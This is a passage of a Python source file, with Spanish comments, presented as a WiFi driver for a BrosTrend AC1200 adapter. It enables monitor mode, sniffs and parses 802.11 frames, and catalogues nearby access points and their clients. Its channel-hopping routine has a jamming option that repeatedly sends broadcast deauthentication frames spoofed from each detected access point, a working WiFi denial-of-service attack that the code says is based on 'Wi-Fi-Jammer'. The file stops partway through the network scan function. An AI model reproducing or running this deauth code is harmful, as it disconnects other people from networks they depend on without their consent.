"""
Controlador WiFi mejorado para adaptador BrosTrend AC1200 AC3L
Versión mejorada con mejor manejo de errores, performance y funcionalidades
"""

import subprocess
import time
import os
import sys
import struct
import threading
import queue
from collections import deque
from typing import Optional, List, Tuple, Dict, Callable
from dataclasses import dataclass

try:
    from scapy.all import *
    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeReq, Dot11ProbeResp, RadioTap, Dot11Elt, Dot11Deauth
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("ADVERTENCIA: scapy no disponible. Instala con: pip install scapy")

try:
    import pyric.pyw as pyw
    PYRIC_AVAILABLE = True
except ImportError:
    PYRIC_AVAILABLE = False


@dataclass
class WiFiNetwork:
    """Información de una red WiFi detectada"""
    ssid: str
    bssid: str
    channel: int
    rssi: int
    encryption: str
    last_seen: float


@dataclass
class WiFiPacket:
    """Paquete WiFi con metadatos"""
    data: bytes
    rssi: int
    channel: int
    timestamp: float
    packet_type: str
    bssid: Optional[str] = None
    ssid: Optional[str] = None
    source: Optional[str] = None
    destination: Optional[str] = None
    encryption: Optional[str] = None


class CircularBuffer:
    """Buffer circular para evitar pérdida de datos"""
    def __init__(self, size: int):
        self.buffer = deque(maxlen=size)
        self.size = size
        self.dropped = 0
    
    def add(self, item):
        """Añade un elemento al buffer"""
        if len(self.buffer) >= self.size:
            self.dropped += 1
        self.buffer.append(item)
    
    def get(self, count: int = 1) -> List:
        """Obtiene elementos del buffer"""
        items = []
        for _ in range(min(count, len(self.buffer))):
            if self.buffer:
                items.append(self.buffer.popleft())
        return items
    
    def peek(self, count: int = 1) -> List:
        """Observa elementos sin quitarlos"""
        return list(self.buffer)[:count]
    
    def clear(self):
        """Limpia el buffer"""
        self.buffer.clear()
        self.dropped = 0
    
    def __len__(self):
        return len(self.buffer)


class WiFiDriver:
    """Controlador mejorado para adaptador WiFi en modo monitor"""
    
    # Canales WiFi
    CHANNELS_2_4 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14]
    CHANNELS_5 = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]
    
    def __init__(self, interface: str = None, auto_detect: bool = True):
        """Inicializa el controlador WiFi mejorado
        
        Args:
            interface: Nombre de la interfaz WiFi (ej: 'wlan0', 'wlan1')
                     Si es None y auto_detect=True, intentará detectar automáticamente
            auto_detect: Si True, detecta automáticamente la interfaz
        """
        self.interface = interface
        self.monitor_interface = None
        self.current_channel = 1
        self.current_band = "2.4"  # "2.4" o "5"
        self.monitor_mode = False
        self.last_packet = None
        self.last_rssi = 0
        self.last_channel = 0
        
        # Estadísticas
        self.packets_received = 0
        self.packets_sent = 0
        self.packets_dropped = 0
        self.start_time = time.time()
        
        # Buffer circular para paquetes
        self.packet_buffer = CircularBuffer(1000)
        
        # Redes WiFi detectadas
        self.networks: Dict[str, WiFiNetwork] = {}
        
        # Listas separadas para clientes-APs y APs (mejora basada en Wi-Fi-Jammer)
        self.clients_APs = []  # Lista de [cliente_mac, ap_mac, canal, ssid]
        self.APs = []  # Lista de [bssid, canal, ssid]
        self.clients_APs_lock = threading.Lock()  # Lock para thread-safety
        
        # Threading para captura asíncrona
        self.capture_thread = None
        self.capture_active = False
        self.packet_queue = queue.Queue(maxsize=500)
        
        # Jamming de banda completa
        self.jam_all_bands_active = False
        self.jam_thread = None
        self.jam_processes = []  # Lista de procesos de jamming activos
        self.jam_threads = []  # Lista de threads de jamming
        self.jamming_active = False  # Flag para jamming con Scapy directo
        
        # Channel hopping automático
        self.channel_hop_active = False
        self.channel_hop_thread = None
        self.first_pass = True  # Primera pasada sin jamming (solo identificación)
        self.channel_hop_lock = threading.Lock()  # Lock para channel hopping
        self.current_hop_channel = None  # Canal actual en hopping
        
        # Filtros
        self.bssid_filter: Optional[str] = None
        self.ssid_filter: Optional[str] = None
        self.packet_type_filter: Optional[str] = None
        
        # Verificar permisos (solo en Unix/Linux)
        try:
            if hasattr(os, 'geteuid') and os.geteuid() != 0:
                print("ADVERTENCIA: Se recomienda ejecutar con sudo para mejor funcionalidad.")
        except AttributeError:
            # Windows no tiene geteuid()
            pass
        
        # Detectar interfaz si no se especifica
        if not self.interface and auto_detect:
            interfaces = self.list_available_interfaces()
            if interfaces:
                self.interface = interfaces[0]
                print(f"Interfaz detectada automáticamente: {self.interface}")
            else:
                raise RuntimeError("No se pudo detectar adaptador WiFi. Verifica la conexión.")
        
        if not self.interface:
            raise ValueError("No se especificó interfaz WiFi")
        
        # Verificar que la interfaz existe
        if not self._interface_exists(self.interface):
            raise RuntimeError(f"La interfaz {self.interface} no existe o no está disponible.")
        
        # Verificar capacidades del adaptador
        self._check_adapter_capabilities()
        
        print(f"Adaptador WiFi inicializado: {self.interface}")
    
    def list_available_interfaces(self) -> List[str]:
        """Lista todas las interfaces WiFi disponibles"""
        interfaces = []
        
        try:
            # Intentar usar pyric (más confiable)
            if PYRIC_AVAILABLE:
                try:
                    cards = pyw.get_wireless_interfaces()
                    if cards:
                        interfaces.extend(cards)
                except:
                    pass
            
            # Fallback: usar iw
            try:
                result = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'Interface' in line:
                            parts = line.split()
                            if len(parts) > 1:
                                iface = parts[1]
                                if iface not in interfaces:
                                    interfaces.append(iface)
            except:
                pass
            
            # Alternativa con ip
            try:
                result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if ': ' in line and ('wl' in line.lower() or 'wlan' in line.lower()):
                            parts = line.split(':')
                            if len(parts) >= 2:
                                iface = parts[1].strip().split()[0]
                                if iface not in interfaces and iface:
                                    interfaces.append(iface)
            except:
                pass
        
        except Exception as e:
            print(f"Error listando interfaces: {e}")
        
        return interfaces
    
    def _interface_exists(self, interface: str) -> bool:
        """Verifica si una interfaz existe"""
        try:
            result = subprocess.run(['iw', 'dev', interface, 'info'], 
                                  capture_output=True, timeout=3)
            return result.returncode == 0
        except:
            # Fallback
            interfaces = self.list_available_interfaces()
            return interface in interfaces
    
    def _check_adapter_capabilities(self):
        """Verifica las capacidades del adaptador"""
        try:
            result = subprocess.run(['iw', 'phy', 'phy0', 'info'], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode != 0:
                # Intentar obtener phy desde la interfaz
                result = subprocess.run(['iw', 'dev', self.interface, 'info'], 
                                      capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                output = result.stdout
                has_monitor = 'monitor' in output.lower()
                has_injection = 'injection' in output.lower() or 'tx' in output.lower()
                
                if not has_monitor:
                    print("ADVERTENCIA: El adaptador puede no soportar modo monitor completamente.")
                if not has_injection:
                    print("ADVERTENCIA: El adaptador puede no soportar inyección de paquetes.")
        
        except Exception as e:
            print(f"Advertencia: No se pudo verificar capacidades del adaptador: {e}")
    
    def set_monitor_mode(self, enable: bool = True) -> bool:
        """Activa o desactiva modo monitor con mejor manejo de errores"""
        if not SCAPY_AVAILABLE:
            print("ERROR: scapy no está disponible. Instala con: pip install scapy")
            return False
        
        # Verificar permisos
        try:
            if enable and hasattr(os, 'geteuid') and os.geteuid() != 0:
                print("ADVERTENCIA: Modo monitor requiere permisos de administrador (sudo)")
        except AttributeError:
            pass
        
        try:
            if enable and not self.monitor_mode:
                # PASO 1: Liberar interfaz - Detener procesos que bloquean
                print("Liberando interfaz WiFi...")
                try:
                    subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15)
                    time.sleep(1)
                except (subprocess.TimeoutExpired, Exception):
                    pass
                
                # PASO 2: Desactivar NetworkManager para esta interfaz
                try:
                    subprocess.run(['sudo', 'nmcli', 'device', 'set', self.interface, 'managed', 'no'], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
                    time.sleep(0.5)
                except Exception:
                    pass
                
                # PASO 3: Bajar la interfaz antes de cambiar modo
                try:
                    subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'down'], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
                    time.sleep(0.5)
                except Exception:
                    pass
                
                # PASO 4: Intentar activar modo monitor
                airmon_available = self._check_command_available('airmon-ng')
                
                if airmon_available:
                    # Intentar con airmon-ng primero (más confiable)
                    try:
                        result = subprocess.run(['sudo', 'airmon-ng', 'start', self.interface], 
                                              capture_output=True, text=True, timeout=15)
                        if result.returncode == 0:
                            # Buscar nueva interfaz monitor
                            for line in result.stdout.split('\n'):
                                if 'monitor mode' in line.lower() or 'mon' in line.lower():
                                    parts = line.split()
                                    for part in parts:
                                        if self.interface in part and 'mon' in part:
                                            self.monitor_interface = part
                                            break
                                    if self.monitor_interface:
                                        break
                            
                            # Si no se encontró, buscar patrones comunes
                            if not self.monitor_interface:
                                monitor_names = [f"{self.interface}mon", f"mon{self.interface[4:]}", f"{self.interface}mon0"]
                                for name in monitor_names:
                                    if self._interface_exists(name):
                                        self.monitor_interface = name
                                        break
                    except subprocess.TimeoutExpired:
                        print("ADVERTENCIA: Timeout con airmon-ng, intentando método alternativo...")
                
                # Fallback: usar iw directamente
                if not self.monitor_interface:
                    try:
                        # Cambiar a modo monitor con iw
                        result = subprocess.run(['sudo', 'iw', self.interface, 'set', 'type', 'monitor'], 
                                              stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
                        if result.returncode == 0:
                            # Subir la interfaz
                            subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'up'], 
                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
                            self.monitor_interface = self.interface
                        else:
                            error_msg = result.stderr.decode('utf-8', errors='ignore') if result.stderr else ""
                            if "Device or resource busy" in error_msg:
                                print("ERROR: La interfaz está siendo usada por otro proceso.")
                                print("Intenta manualmente: sudo airmon-ng check kill")
                                return False
                    except subprocess.TimeoutExpired:
                        print("ERROR: Timeout cambiando a modo monitor")
                        return False
                    except Exception as e:
                        print(f"ERROR: {e}")
                        return False
                
                if self.monitor_interface:
                    self.monitor_mode = True
                    print(f"Modo monitor activado en {self.monitor_interface}")
                    
                    # Iniciar captura asíncrona
                    self._start_capture_thread()
                    return True
                else:
                    print("ERROR: No se pudo crear interfaz en modo monitor")
                    print("Sugerencias:")
                    print("  1. Ejecuta: sudo airmon-ng check kill")
                    print("  2. Ejecuta: sudo nmcli device set wlan1 managed no")
                    print("  3. Verifica que el adaptador soporte modo monitor: iw phy phy1 info")
                    return False
            
            elif not enable and self.monitor_mode:
                # Detener captura
                self._stop_capture_thread()
                
                # Desactivar modo monitor
                try:
                    if self.monitor_interface and self.monitor_interface != self.interface:
                        subprocess.run(['sudo', 'airmon-ng', 'stop', self.monitor_interface], 
                                     capture_output=True, timeout=10)
                    elif self.monitor_interface:
                        # Restaurar modo managed
                        subprocess.run(['sudo', 'iw', self.interface, 'set', 'type', 'managed'], 
                                     capture_output=True, timeout=5)
                    
                    self.monitor_mode = False
                    self.monitor_interface = None
                    return True
                except Exception as e:
                    print(f"Error desactivando modo monitor: {e}")
                    return False
            
            return True
        
        except subprocess.TimeoutExpired:
            print("ERROR: Timeout esperando respuesta del sistema")
            return False
        except PermissionError:
            print("ERROR: Permisos insuficientes. Ejecuta con sudo.")
            return False
        except Exception as e:
            print(f"ERROR en set_monitor_mode: {e}")
            return False
    
    def _check_command_available(self, command: str) -> bool:
        """Verifica si un comando está disponible (multiplataforma)"""
        try:
            # Windows usa 'where', Unix/Linux usa 'which'
            if sys.platform == 'win32':
                cmd = ['where', command]
            else:
                cmd = ['which', command]
            result = subprocess.run(cmd, capture_output=True, timeout=2)
            return result.returncode == 0
        except:
            return False
    
    def _start_capture_thread(self):
        """Inicia thread para captura asíncrona de paquetes"""
        if self.capture_thread and self.capture_thread.is_alive():
            return
        
        self.capture_active = True
        self.capture_thread = threading.Thread(target=self._capture_loop, daemon=True)
        self.capture_thread.start()
    
    def _stop_capture_thread(self):
        """Detiene el thread de captura"""
        self.capture_active = False
        if self.capture_thread:
            self.capture_thread.join(timeout=2)
    
    def _capture_loop(self):
        """Loop de captura de paquetes en thread separado"""
        if not SCAPY_AVAILABLE or not self.monitor_mode:
            return
        
        interface = self.monitor_interface or self.interface
        
        try:
            while self.capture_active:
                try:
                    # Capturar paquetes (no bloqueante si no hay)
                    # stop_filter retorna False para capturar todos los paquetes
                    packets = sniff(iface=interface, count=10, timeout=0.1, quiet=True)
                    
                    for packet in packets:
                        if not self.capture_active:
                            break
                        
                        # Aplicar filtros
                        if not self._packet_passes_filter(packet):
                            continue
                        
                        # Extraer información del paquete
                        wifi_pkt = self._parse_packet(packet)
                        
                        if wifi_pkt:
                            # Detectar clientes y APs automáticamente (mejora basada en Wi-Fi-Jammer)
                            self._detect_clients_and_aps(packet, wifi_pkt)
                            
                            # Añadir a buffer circular
                            try:
                                self.packet_queue.put_nowait(wifi_pkt)
                                self.packet_buffer.add(wifi_pkt)
                                self.packets_received += 1
                                
                                # Actualizar última información
                                self.last_packet = wifi_pkt
                                self.last_rssi = wifi_pkt.rssi
                                self.last_channel = wifi_pkt.channel
                            except queue.Full:
                                self.packets_dropped += 1
                
                except Exception as e:
                    if self.capture_active:
                        time.sleep(0.1)  # Evitar loop infinito de errores
        
        except Exception as e:
            print(f"Error en thread de captura: {e}")
    
    def _parse_packet(self, packet) -> Optional[WiFiPacket]:
        """Parsea un paquete WiFi y extrae información"""
        try:
            rssi = -100
            channel = self.current_channel
            packet_type = "Unknown"
            bssid = None
            ssid = None
            
            # Extraer RSSI y canal
            if packet.haslayer(RadioTap):
                rssi = packet[RadioTap].dBm_AntSignal or -100
                # RadioTap.Channel puede contener frecuencia en MHz o número de canal
                # Intentar obtener el canal, si es frecuencia, convertirla
                raw_channel = packet[RadioTap].Channel
                if raw_channel:
                    # Si el valor es > 100, probablemente es frecuencia en MHz
                    if raw_channel > 100:
                        # Convertir frecuencia a canal
                        if 2400 <= raw_channel <= 2500:
                            # 2.4 GHz: 2412 MHz = canal 1, 2417 MHz = canal 2, etc.
                            channel = int((raw_channel - 2407) / 5) + 1
                            if channel < 1:
                                channel = 1
                            elif channel > 14:
                                channel = 14
                        elif 5000 <= raw_channel <= 6000:
                            # 5 GHz: 5000 + (canal * 5) = frecuencia
                            channel = int((raw_channel - 5000) / 5)
                            if channel < 36:
                                channel = 36
                            elif channel > 165:
                                channel = 165
                        else:
                            channel = self.current_channel
                    else:
                        # Es un número de canal válido
                        channel = int(raw_channel)
                else:
                    channel = self.current_channel
            
            # Extraer información de Dot11
            source_mac = None
            dest_mac = None
            encryption_info = None
            
            if packet.haslayer(Dot11):
                dot11 = packet[Dot11]
                
                # Extraer direcciones MAC según el tipo de paquete
                if dot11.addr1:  # Destination
                    dest_mac = dot11.addr1
                if dot11.addr2:  # Source/Transmitter
                    source_mac = dot11.addr2
                if dot11.addr3:  # BSSID (en paquetes de infraestructura)
                    bssid = dot11.addr3
                elif dot11.addr2:  # Fallback
                    bssid = dot11.addr2
                elif dot11.addr1:
                    bssid = dot11.addr1
                
                # Determinar tipo de paquete y extraer información adicional
                if packet.haslayer(Dot11Beacon):
                    packet_type = "Beacon"
                    # Extraer SSID y cifrado
                    if packet.haslayer(Dot11Elt):
                        for elt in packet[Dot11Elt]:
                            if elt.ID == 0:  # SSID
                                ssid = elt.info.decode('utf-8', errors='ignore') if elt.info else "<hidden>"
                            elif elt.ID == 48:  # RSN (WPA2)
                                encryption_info = "WPA2"
                            elif elt.ID == 221:  # Vendor specific (puede contener WPA)
                                if b'WPA' in elt.info or b'wpa' in elt.info:
                                    encryption_info = "WPA"
                
                elif packet.haslayer(Dot11ProbeReq):
                    packet_type = "ProbeReq"
                    # Extraer SSID de Probe Request
                    if packet.haslayer(Dot11Elt):
                        for elt in packet[Dot11Elt]:
                            if elt.ID == 0:  # SSID
                                ssid = elt.info.decode('utf-8', errors='ignore') if elt.info else "<hidden>"
                                break
                
                elif packet.haslayer(Dot11ProbeResp):
                    packet_type = "ProbeResp"
                    # Extraer SSID de Probe Response
                    if packet.haslayer(Dot11Elt):
                        for elt in packet[Dot11Elt]:
                            if elt.ID == 0:  # SSID
                                if elt.info and len(elt.info) > 0:
                                    ssid = elt.info.decode('utf-8', errors='ignore')
                                    if not ssid.strip():
                                        ssid = "<hidden>"
                                else:
                                    ssid = "<hidden>"
                                break
                
                elif dot11.type == 0:  # Management frames
                    if dot11.subtype == 8:
                        packet_type = "Beacon"
                    elif dot11.subtype == 4:
                        packet_type = "ProbeReq"
                    elif dot11.subtype == 5:
                        packet_type = "ProbeResp"
                    elif dot11.subtype == 10:
                        packet_type = "Disassoc"
                    elif dot11.subtype == 11:
                        packet_type = "Auth"
                    elif dot11.subtype == 12:
                        packet_type = "Deauth"
                    else:
                        packet_type = f"Mgmt-{dot11.subtype}"
                
                elif dot11.type == 1:  # Control frames
                    if dot11.subtype == 11:
                        packet_type = "RTS"
                    elif dot11.subtype == 12:
                        packet_type = "CTS"
                    elif dot11.subtype == 13:
                        packet_type = "ACK"
                    else:
                        packet_type = f"Ctrl-{dot11.subtype}"
                
                elif dot11.type == 2:  # Data frames
                    if dot11.subtype == 0:
                        packet_type = "Data"
                    elif dot11.subtype == 1:
                        packet_type = "Data+CF-Ack"
                    elif dot11.subtype == 2:
                        packet_type = "Data+CF-Poll"
                    elif dot11.subtype == 3:
                        packet_type = "Data+CF-Ack+CF-Poll"
                    elif dot11.subtype == 4:
                        packet_type = "Null"
                    elif dot11.subtype == 8:
                        packet_type = "QoS Data"
                    else:
                        packet_type = f"Data-{dot11.subtype}"
                else:
                    packet_type = f"Type{dot11.type}Subtype{dot11.subtype}"
            
            return WiFiPacket(
                data=bytes(packet),
                rssi=rssi,
                channel=channel,
                timestamp=time.time(),
                packet_type=packet_type,
                bssid=bssid,
                ssid=ssid,
                source=source_mac,
                destination=dest_mac,
                encryption=encryption_info
            )
        
        except Exception as e:
            return None
    
    def _packet_passes_filter(self, packet) -> bool:
        """Verifica si un paquete pasa los filtros configurados"""
        if not self.bssid_filter and not self.ssid_filter and not self.packet_type_filter:
            return True
        
        if packet.haslayer(Dot11):
            dot11 = packet[Dot11]
            
            # Filtro por BSSID
            if self.bssid_filter:
                bssid = dot11.addr3 if dot11.addr3 else (dot11.addr2 if dot11.addr2 else dot11.addr1)
                if bssid and self.bssid_filter.lower() != bssid.lower():
                    return False
            
            # Filtro por SSID
            if self.ssid_filter and packet.haslayer(Dot11Elt):
                for elt in packet[Dot11Elt]:
                    if elt.ID == 0:  # SSID
                        ssid = elt.info.decode('utf-8', errors='ignore') if elt.info else ""
                        if self.ssid_filter.lower() not in ssid.lower():
                            return False
                        break
            
            # Filtro por tipo de paquete
            if self.packet_type_filter:
                if self.packet_type_filter.lower() == "beacon" and not packet.haslayer(Dot11Beacon):
                    return False
                elif self.packet_type_filter.lower() == "data" and dot11.type != 2:
                    return False
        
        return True
    
    def set_channel(self, channel: int, silent: bool = False) -> bool:
        """Establece el canal WiFi con validación
        
        Args:
            channel: Canal a establecer
            silent: Si True, no imprime errores (útil para loops)
        """
        # Validar canal
        if channel not in self.CHANNELS_2_4 and channel not in self.CHANNELS_5:
            if not silent:
                print(f"ERROR: Canal {channel} no válido. Use 1-14 para 2.4GHz o 36-165 para 5GHz")
            return False
        
        if channel in self.CHANNELS_2_4:
            self.current_band = "2.4"
        elif channel in self.CHANNELS_5:
            self.current_band = "5"
        
        self.current_channel = channel
        
        try:
            interface = self.monitor_interface or self.interface
            if not interface:
                return False
            
            # Si la interfaz no está en modo monitor, intentar activarlo primero
            if not self.monitor_mode:
                if not silent:
                    print(f"ADVERTENCIA: Modo monitor no activo. Intentando activar...")
                self.set_monitor_mode(True)
            
            result = subprocess.run(['sudo', 'iw', 'dev', interface, 'set', 'channel', str(channel)], 
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
            
            if result.returncode == 0:
                time.sleep(0.1)  # Esperar cambio de canal
                return True
            else:
                error_msg = result.stderr.decode('utf-8', errors='ignore') if result.stderr else "Unknown error"
                if not silent:
                    # Manejar errores específicos
                    if "Device or resource busy" in error_msg:
                        print(f"ERROR: Interfaz ocupada. Intenta: sudo airmon-ng check kill")
                    elif "disabled" not in error_msg.lower() and "invalid" not in error_msg.lower():
                        print(f"ERROR cambiando canal {channel}: {error_msg}")
                return False
        
        except subprocess.TimeoutExpired:
            if not silent:
                print("ERROR: Timeout cambiando canal")
            return False
        except Exception as e:
            if not silent:
                print(f"ERROR cambiando canal: {e}")
            return False
    
    def set_filter_bssid(self, bssid: Optional[str]):
        """Configura filtro por BSSID"""
        self.bssid_filter = bssid
    
    def set_filter_ssid(self, ssid: Optional[str]):
        """Configura filtro por SSID"""
        self.ssid_filter = ssid
    
    def set_filter_packet_type(self, ptype: Optional[str]):
        """Configura filtro por tipo de paquete"""
        self.packet_type_filter = ptype
    
    def get_rssi(self) -> int:
        """Obtiene RSSI del último paquete"""
        return self.last_rssi
    
    def get_channel(self) -> int:
        """Obtiene el canal actual"""
        return self.current_channel
    
    def _noise_filter(self, addr1: str, addr2: str, skip_mac: Optional[str] = None) -> bool:
        """Filtra direcciones MAC problemáticas (mejora basada en Wi-Fi-Jammer)"""
        if not addr1 or not addr2:
            return True
        
        addr1_lower = addr1.lower()
        addr2_lower = addr2.lower()
        
        # Lista de direcciones a ignorar
        ignore = [
            'ff:ff:ff:ff:ff:ff',  # Broadcast
            '00:00:00:00:00:00',  # Null
            '33:33:00:',          # IPv6 multicast
            '33:33:ff:',          # IPv6 multicast
            '01:80:c2:00:00:00',  # Spanning tree
            '01:00:5e:',          # IPv4 multicast
        ]
        
        # Agregar MAC del adaptador si está disponible
        try:
            interface = self.monitor_interface or self.interface
            if interface:
                # Intentar obtener MAC del adaptador
                result = subprocess.run(['cat', f'/sys/class/net/{interface}/address'], 
                                      capture_output=True, text=True, timeout=2)
                if result.returncode == 0:
                    adapter_mac = result.stdout.strip().lower()
                    if adapter_mac:
                        ignore.append(adapter_mac)
        except:
            pass
        
        # Agregar MAC a saltar si se especifica
        if skip_mac:
            ignore.append(skip_mac.lower())
        
        # Verificar si alguna dirección está en la lista de ignorar
        for i in ignore:
            if i in addr1_lower or i in addr2_lower:
                return True
        
        return False
    
    def _detect_clients_and_aps(self, packet, wifi_pkt: WiFiPacket):
        """Detecta clientes y APs automáticamente (mejora basada en Wi-Fi-Jammer)"""
        if not packet.haslayer(Dot11):
            return
        
        dot11 = packet[Dot11]
        if not dot11.addr1 or not dot11.addr2:
            return
        
        addr1 = dot11.addr1.lower()
        addr2 = dot11.addr2.lower()
        
        # Filtrar ruido
        if self._noise_filter(addr1, addr2):
            return
        
        # Detectar APs (Beacons y Probe Responses)
        if packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp):
            self._add_ap(packet, wifi_pkt, dot11)
        
        # Detectar clientes (paquetes tipo 1 - Control, tipo 2 - Data)
        # Estos indican comunicación real entre cliente y AP
        if dot11.type in [1, 2]:  # Control o Data frames
            self._add_client_ap_pair(addr1, addr2, wifi_pkt.channel)
    
    def _add_ap(self, packet, wifi_pkt: WiFiPacket, dot11):
        """Agrega un AP a la lista"""
        bssid = dot11.addr3.lower() if dot11.addr3 else None
        if not bssid:
            return
        
        ssid = wifi_pkt.ssid or "<hidden>"
        channel = wifi_pkt.channel
        
        # Verificar que el canal sea válido
        if channel not in self.CHANNELS_2_4 and channel not in self.CHANNELS_5:
            return
        
        with self.clients_APs_lock:
            # Verificar si el AP ya está en la lista
            for ap in self.APs:
                if bssid in ap[0].lower():
                    return
            
            # Agregar nuevo AP
            self.APs.append([bssid, str(channel), ssid])
    
    def _add_client_ap_pair(self, addr1: str, addr2: str, channel: int):
        """Agrega un par cliente-AP a la lista"""
        # Verificar que el canal sea válido
        if channel not in self.CHANNELS_2_4 and channel not in self.CHANNELS_5:
            return
        
        with self.clients_APs_lock:
            # Si tenemos APs en la lista, verificar si alguna dirección es un AP conocido
            if len(self.APs) > 0:
                for ap in self.APs:
                    ap_bssid = ap[0].lower()
                    if ap_bssid in addr1.lower() or ap_bssid in addr2.lower():
                        # Encontrar el AP y el cliente
                        if ap_bssid in addr1.lower():
                            client = addr2
                            ap_mac = addr1
                        else:
                            client = addr1
                            ap_mac = addr2
                        
                        # Verificar si el par ya existe
                        for ca in self.clients_APs:
                            if client.lower() in ca[0].lower() and ap_mac.lower() in ca[1].lower():
                                return
                        
                        # Agregar nuevo par con SSID si está disponible
                        ssid = ap[2] if len(ap) > 2 else ""
                        self.clients_APs.append([client, ap_mac, str(channel), ssid])
                        return
            
            # Si no hay APs conocidos, agregar el par con el canal actual
            # Verificar si el par ya existe
            for ca in self.clients_APs:
                if addr1.lower() in ca[0].lower() and addr2.lower() in ca[1].lower():
                    return
                if addr2.lower() in ca[0].lower() and addr1.lower() in ca[1].lower():
                    return
            
            # Agregar nuevo par sin SSID
            self.clients_APs.append([addr1, addr2, str(channel)])
    
    def start_channel_hopping(self, channels: List[int] = None, hop_interval: float = 1.0, 
                              enable_jamming: bool = False):
        """Inicia channel hopping automático (mejora basada en Wi-Fi-Jammer)
        
        Args:
            channels: Lista de canales para hacer hopping (None = todos los canales)
            hop_interval: Tiempo en segundos en cada canal
            enable_jamming: Si True, hace jamming mientras hace hopping (después de primera pasada)
        """
        if self.channel_hop_active:
            print("Channel hopping ya está activo")
            return
        
        if channels is None:
            # Usar todos los canales disponibles
            channels = self.CHANNELS_2_4 + self.CHANNELS_5
        
        self.channel_hop_active = True
        self.first_pass = True
        self.channel_hop_channels = channels
        self.channel_hop_interval = hop_interval
        self.channel_hop_jamming = enable_jamming
        
        self.channel_hop_thread = threading.Thread(
            target=self._channel_hop_loop,
            daemon=True
        )
        self.channel_hop_thread.start()
        print(f"Channel hopping iniciado en {len(channels)} canales (intervalo: {hop_interval}s)")
    
    def stop_channel_hopping(self):
        """Detiene el channel hopping automático"""
        if not self.channel_hop_active:
            return
        
        self.channel_hop_active = False
        if self.channel_hop_thread:
            self.channel_hop_thread.join(timeout=2)
        print("Channel hopping detenido")
    
    def _channel_hop_loop(self):
        """Loop de channel hopping automático"""
        channel_index = 0
        max_channels = len(self.channel_hop_channels)
        
        while self.channel_hop_active:
            try:
                # Obtener canal actual
                if channel_index >= max_channels:
                    channel_index = 0
                    with self.channel_hop_lock:
                        self.first_pass = False  # Primera pasada completada
                
                channel = self.channel_hop_channels[channel_index]
                
                # Cambiar a este canal
                with self.channel_hop_lock:
                    self.current_hop_channel = channel
                
                if self.set_channel(channel, silent=True):
                    # Si no es primera pasada y jamming está habilitado, hacer jamming
                    if not self.first_pass and self.channel_hop_jamming:
                        # Buscar APs en este canal
                        target_bssid = None
                        with self.clients_APs_lock:
                            for ap in self.APs:
                                if str(channel) == ap[1]:
                                    target_bssid = ap[0]
                                    break
                        
                        if target_bssid:
                            # Enviar algunos paquetes deauth
                            try:
                                deauth_pkt = RadioTap() / Dot11(
                                    addr1='ff:ff:ff:ff:ff:ff',
                                    addr2=target_bssid.lower(),
                                    addr3=target_bssid.lower()
                                ) / Dot11Deauth()
                                
                                interface = self.monitor_interface or self.interface
                                if interface:
                                    sendp(deauth_pkt, iface=interface, count=5, inter=0.1, verbose=False)
                            except:
                                pass
                    
                    # Esperar el intervalo especificado
                    time.sleep(self.channel_hop_interval)
                else:
                    # Si falla cambiar canal, esperar un poco menos
                    time.sleep(self.channel_hop_interval * 0.5)
                
                channel_index += 1
                
            except Exception as e:
                time.sleep(0.5)
                continue
    
    def get_statistics(self) -> Dict:
        """Obtiene estadísticas de tráfico"""
        elapsed = time.time() - self.start_time
        return {
            'packets_received': self.packets_received,
            'packets_sent': self.packets_sent,
            'packets_dropped': self.packets_dropped,
            'buffer_size': len(self.packet_buffer),
            'buffer_dropped': self.packet_buffer.dropped,
            'elapsed_time': elapsed,
            'packets_per_second': self.packets_received / elapsed if elapsed > 0 else 0,
            'networks_found': len(self.networks)
        }
    
    def scan_networks(self, duration: float = 2.0) -> List[WiFiNetwork]:
        """Escanea y lista redes WiFi disponibles"""
        if not self.monitor_mode:
            if not self.set_monitor_mode(True):
                return []
        
        networks = {}
        start_time = time.time()
        
        # Limpiar buffer antes de escanear para obtener datos frescos
        self.packet_buffer = CircularBuffer(1000)
        
        # Calcular tiempo por canal basado en duración total
        # Priorizar 2.4 GHz (más común) y luego 5 GHz
        channels_2_4 = self.CHANNELS_2_4.copy()
        channels_5 = self.CHANNELS_5.copy()
        
        # Si la duración es corta, escanear solo 2.4 GHz primero
        if duration < 3.0:
            all_channels = channels_2_4
        else:
            all_channels = channels_2_4 + channels_5
        
        time_per_channel = duration / len(all_channels) if all_channels else 0.1
        # Mínimo 0.3 segundos por canal para capturar múltiples beacons
        # Los beacons se envían típicamente cada 100ms
        time_per_channel = max(0.3, time_per_channel)
        
        print(f"Escaneando {len(all_channels)} canales ({time_per_channel:.2f}s por canal)...")
        
        for channel in all_channels:
            if time.time() - start_time > duration:
                break
            
            # Cambiar a este canal
            self.set_channel(channel, silent=True)
            
            # Esperar más tiempo para capturar múltiples beacons
            # Los beacons se envían típicamente cada 100ms
            scan_time = min(time_per_channel, duration - (time.time() - start_time))
            if scan_time <= 0:
                break
            
            # Capturar paquetes activamente durante el tiempo asignado
            scan_start = time.time()
            packets_captured = 0
            
            while (time.time() - scan_start) < scan_time:
                # Capturar paquetes directamente en este canal
                if SCAPY_AVAILABLE:
                    interface = self.monitor_interface or self.interface
                    try:
                        # Capturar paquetes con timeout corto
